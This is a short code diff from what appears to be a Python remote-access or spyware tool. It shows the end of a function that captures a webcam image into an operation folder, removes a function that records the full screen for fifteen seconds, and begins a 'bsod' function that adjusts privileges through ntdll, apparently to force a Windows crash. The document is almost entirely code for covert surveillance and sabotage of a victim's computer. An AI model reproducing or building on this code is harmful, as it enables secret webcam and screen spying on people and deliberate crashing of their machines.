@@ -56,25 +56,6 @@ def webcamshot():
   pygame.image.save(img, f"{operation_dir}\\webcamshot.png")
   return f"{operation_dir}\\webcamshot.png"
 
-def sc_rec():
-  out = f"{operation_dir}\\screenrecording.mp4"
-  s_w, s_h = pyautogui.size()
-  s_r = (0, 0, s_w, s_h)
-  frames = []
-  length = 15
-  fps = 60
-  num_frames = length * fps
-  st_t = time.time()
-
-  for i in range (num_frames):
-    img = pyautogui.screenshot(region=s_r)
-    frame = np.array(img)
-    frames.append(frame)
-
-  imageio.mimsave(out, frames, fps=fps)
-  return out
-
-
 def bsod():
   windll.ntdll.RtlAdjustPrivilege(
     c_uint(19),
